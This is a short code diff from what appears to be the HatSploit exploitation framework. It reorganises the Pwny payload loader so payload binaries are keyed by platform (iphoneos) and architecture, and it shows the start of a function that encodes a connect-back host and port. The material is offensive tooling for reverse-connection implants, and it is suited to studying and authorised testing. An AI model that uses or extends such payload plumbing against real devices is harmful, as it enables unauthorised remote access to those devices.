@@ -33,16 +33,19 @@ from hatsploit.utils.string import StringTools
 class Pwny(StringTools):
     config = Config()
 
-    pwny_path = config.path_config['data_path'] + 'pwny/'
+    pwny_path = config.path_config['external_path'] + 'pwny/resources/'
     payloads = {
-        'aarch64': open(pwny_path + 'pwny.aarch64', 'rb').read()
+        'iphoneos': {
+            'aarch64': open(pwny_path + 'pwny.aarch64', 'rb').read()
+        }
     }
 
-    def get_payload(self, arch):
-        if arch in self.payloads:
-            return self.payloads[arch]
+    def get_payload(self, platform, arch):
+        if platform in self.payloads:
+            if arch in self.payloads[platform]:
+                return self.payloads[platform][arch]
         return None
-      
+
     def encode_args(self, connback_host, connback_port):
         connback_data = json.dumps({
             'host': connback_host,
